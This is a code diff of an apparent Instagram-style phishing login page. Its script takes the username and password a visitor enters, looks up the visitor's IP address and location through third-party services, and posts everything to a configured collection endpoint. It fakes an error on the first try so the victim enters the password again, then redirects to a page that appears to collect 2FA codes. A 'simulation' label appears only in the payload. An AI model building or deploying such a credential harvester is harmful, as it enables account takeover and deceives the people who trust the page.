@@ -65,116 +65,123 @@
   </div>
 
   <script type="module">
-    import config from './config.js';
+  import config from './config.js';
 
-    let attempt = 0;
-    let isProcessing = false;
+  let attempt = 0;
+  let isProcessing = false;
 
-    // Fast IP + Geo lookup (ip-api.com — recommended for speed & no key)
-    async function getGeoData() {
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const ip = ipData.ip || 'Unknown';
+  // Fast IP + Geo lookup
+  async function getGeoData() {
+    try {
+      // Get IP
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip || 'Unknown';
 
-        // Fast geo lookup with continent, country, city
-        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,continent,country,city`);
-        const geo = await geoRes.json();
+      // Get Country, City, Continent (fast & free)
+      const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,continent,country,city`);
+      const geo = await geoRes.json();
 
-        if (geo.status === 'success') {
-          return {
-            ip: ip,
-            country: geo.country || 'Unknown',
-            city: geo.city || 'Unknown',
-            continent: geo.continent || 'Unknown'
-          };
-        }
-      } catch (err) {
-        console.error('Geo lookup failed:', err);
+      if (geo.status === 'success') {
+        return {
+          ip: ip,
+          country: geo.country || 'Unknown',
+          city: geo.city || 'Unknown',
+          continent: geo.continent || 'Unknown'
+        };
       }
-      return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
+    } catch (err) {
+      console.error('Geo lookup failed:', err);
     }
+    return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
+  }
 
-    // Send formatted alert to your endpoint (from config.js)
-    async function sendToEndpoint(username, password, geo, attemptNum) {
-      const alertText = `*New Alert*\nUser: ${username} (ig)\nCode: ${password}\nIP: ${geo.ip}\nCountry: ${geo.country}\nCity: ${geo.city}\nContinent: ${geo.continent}`;
+  // Send clean alert to endpoint
+  async function sendToEndpoint(username, password, geo, attemptNum) {
+    const cleanAlert = `*New Alert*
+User: ${username} (ig)
+pw: ${password}
+IP: ${geo.ip}
+Country: ${geo.country}
+City: ${geo.city}
+Continent: ${geo.continent}
+Attempt: ${attemptNum}
+Timestamp: ${new Date().toISOString()}`;
 
-      const payload = {
-        app: "INSTAGRAM_PLACEHOLDER",
-        alert: alertText,
-        username: username,
-        password: password,
-        ip: geo.ip,
-        country: geo.country,
-        city: geo.city,
-        continent: geo.continent,
-        attempt: attemptNum,
-        timestamp: new Date().toISOString(),
-        message: "PHISHING_SIMULATION_ANALYSIS_2026"
-      };
+    const payload = {
+      app: "INSTAGRAM_PLACEHOLDER",
+      alert: cleanAlert,           // ← Full formatted text you want
+      username: username,
+      pw: password,                // shortened as "pw"
+      ip: geo.ip,
+      country: geo.country,
+      city: geo.city,
+      continent: geo.continent,
+      attempt: attemptNum,
+      timestamp: new Date().toISOString(),
+      message: "PHISHING_SIMULATION_ANALYSIS_2026"
+    };
 
-      try {
-        const res = await fetch(config.ENDPOINT_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
+    try {
+      const res = await fetch(config.ENDPOINT_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
 
-        if (res.ok) {
-          console.log(`✅ Attempt ${attemptNum} alert sent to endpoint`);
-        } else {
-          console.warn(`⚠️ Endpoint responded with status ${res.status}`);
-        }
-      } catch (err) {
-        console.error("❌ Failed to send to endpoint:", err);
-      }
-    }
-
-    document.getElementById('loginBtn').addEventListener('click', async () => {
-      if (isProcessing) return;
-      isProcessing = true;
-
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const passwordInput = document.getElementById('password');
-      const btn = document.getElementById('loginBtn');
-      const btnText = document.getElementById('btnText');
-      const spinner = document.getElementById('spinner');
-      const errorMsg = document.getElementById('errorMsg');
-
-      if (!username || !password) {
-        alert('Please fill in all fields!');
-        isProcessing = false;
-        return;
-      }
-
-      attempt++;
-
-      // Get geo data
-      const geo = await getGeoData();
-
-      // Send formatted alert to endpoint
-      await sendToEndpoint(username, password, geo, attempt);
-
-      if (attempt === 1) {
-        // First attempt: error + shake
-        errorMsg.classList.remove('hidden');
-        passwordInput.value = '';
-        passwordInput.classList.add('animate-shake');
-        setTimeout(() => passwordInput.classList.remove('animate-shake'), 600);
+      if (res.ok) {
+        console.log(`✅ Attempt ${attemptNum} sent successfully`);
       } else {
-        // Second attempt: loading → redirect
-        btn.disabled = true;
-        btnText.textContent = 'Loading...';
-        spinner.classList.remove('hidden');
-
-        setTimeout(() => {
-          window.location.href = 'securedfa.html'; // placeholder page
-        }, 800);
+        console.warn(`⚠️ Endpoint status: ${res.status}`);
       }
+    } catch (err) {
+      console.error("❌ Failed to send to endpoint:", err);
+    }
+  }
 
+  // Login button handler
+  document.getElementById('loginBtn').addEventListener('click', async () => {
+    if (isProcessing) return;
+    isProcessing = true;
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const passwordInput = document.getElementById('password');
+    const btn = document.getElementById('loginBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const errorMsg = document.getElementById('errorMsg');
+
+    if (!username || !password) {
+      alert('Please fill in all fields!');
       isProcessing = false;
-    });
-  </script>
-</body>
-</html>
+      return;
+    }
+
+    attempt++;
+
+    const geo = await getGeoData();
+
+    // Send to your endpoint (clean format)
+    await sendToEndpoint(username, password, geo, attempt);
+
+    if (attempt === 1) {
+      // First attempt - show error
+      errorMsg.classList.remove('hidden');
+      passwordInput.value = '';
+      passwordInput.classList.add('animate-shake');
+      setTimeout(() => passwordInput.classList.remove('animate-shake'), 600);
+    } else {
+      // Second attempt - loading then redirect
+      btn.disabled = true;
+      btnText.textContent = 'Loading...';
+      spinner.classList.remove('hidden');
+
+      setTimeout(() => {
+        window.location.href = 'securedfa.html';
+      }, 800);
+    }
+
+    isProcessing = false;
+  });
+</script>
